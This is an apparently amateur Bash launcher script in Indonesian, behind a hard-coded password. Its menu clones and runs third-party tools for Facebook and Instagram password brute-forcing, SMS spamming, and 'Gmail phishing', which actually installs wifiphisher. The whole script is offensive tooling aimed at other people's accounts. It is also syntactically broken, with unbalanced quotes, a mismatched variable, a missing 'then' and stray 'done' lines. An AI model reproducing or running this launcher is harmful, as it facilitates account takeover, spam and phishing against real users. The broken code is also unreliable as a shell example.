#!/bin/bash

echo  -n "Masukkan password Anda Di Sini :"
read pwd ;

if  [ $pwd = "arifisal" ]
then 
echo "\033[33;1m' "Password Anda Bener"
else 
echo "\033[32;1m' "Password Anda Salah"
echo "\033[35;1m' "Silahkan Masukkan Lagi"
fi

echo "green='\033[32;1m'  
echo "purple='\033[35;1m'
echo "cyan='\033[36;1m'
echo $me"red='\033[31;1m'
echo $me"white='\033[37;1m'                                           
echo $me"yellow='\033[33;1m'

echo 
echo "…………………../''''''/"
echo "……………….../.../"
echo "………………./…./"
echo "…………./¯/.../¯¯\"             "Name   : "Faisal"
echo "....…../…/…./../¨¯\"           "me Alamat :  "Gebang"
echo "….…./….….…..../.….\"         "Team   :   "Punk Muslim"
echo "………\………………../"          "No Wa : "  085xxxxxxxxx"
echo "…….…\………......./
echo "…………\…………..\"
echo "…………..\………….\"
sleep 2
echo 
echo 
echo "[==========================]"
echo "[" "1. Hack Fb"
echo "[==========================]"
echo "[" "2. Hack Spaam All"
echo "[==========================]"
echo "[" "3.  Bruteforce Instagram"
echo "[==========================]"
echo "[" "4. Phishing Akun Gmail"
echo "[==========================]"
echo "[" "00.          Exit"                          
echo "[==========================]"
echo
echo $me"[====Pilih sayang toolsnya=======]"
read -p "#-Sayang : " pil

if [ $sayang = "1" ] :
then
echo "Insatalling Hack Fb"
cd $HOME
apt update && apt upgrade
pkg install python2
pip install mechanize
pkg install git
git clone https://github.com/NeloF4/Bruteforcefb.git
python2 Brutefb.py
wordlist.txt
fi

if [ $sayang = "2" ]
echo "Installing Hack Spaam All"
cd $HOME
pkg install php
pkg install git
git clone https://github.com/4L13199/LITESPAM
cd LITESPAM
sh LITESPAM.sh
fi

if [ $sayang = "3" ] :
then
echo "Installing Bruteforce Instagram"
cd $HOME
apt update && apt upgrade
pkg install python git nano
git clone https://github.com/avramit/instahack.git
cd instahack
pip install requests
cd instahack
nano pass.txt
cat pass.txt
python hackinsta.py
fi

if [ $sayang = "4" ] :
then
echo "Installing Phising Akun Gmail"
cd $HOME 
apt-get update && apt-get upgrade
apt-get install git
apt-get install python python-pip python-setuptools
pip install scapy
git clone https://github.com/wifiphisher/wifiphisher.git
cd wifiphisher<
python setup.py install
cd wifiphisher
python wifiphisher
fi

if [ $sayang = "00" ] :
then 
echo "Terimah Kasih Sayang"
sleep 1
 exit
 else
 echo "Error Sayang : Anda Masukkan Input"
 echo $ulang
 fi
 done
 done

